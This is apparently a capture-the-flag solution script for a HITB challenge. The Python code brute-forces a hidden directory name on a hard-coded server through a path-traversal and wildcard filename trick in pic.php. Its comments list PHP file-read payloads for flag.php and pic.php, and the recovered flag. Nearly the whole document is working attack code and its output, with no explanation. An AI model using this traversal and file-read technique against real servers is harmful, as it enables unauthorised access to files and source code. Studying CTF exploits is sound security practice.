import requests
import string

path = ''
for k in range(32):
    for i in string.printable:
        url = "http://47.90.97.18:9999/pic.php?filename=../{}</1523530410.php".format(path + str(i))
        res = requests.get(url)
        if res.content != "image error":
            path += str(i)
            print path
            break


# 87194f13726af7cee27ba2cfe97b60df
# var_dump(fread(fopen('../pic.php', 'r')));
# C:\inetpub\wwwroot\87194f13726af7cee27ba2cfe97b60df
# var_dump(file_get_contents(%27../flag.php%27));
# <?php
# echo "flag is here";
# //HITB{e5f476c1e4c6dc66278db95f0b5a228a}
# ?>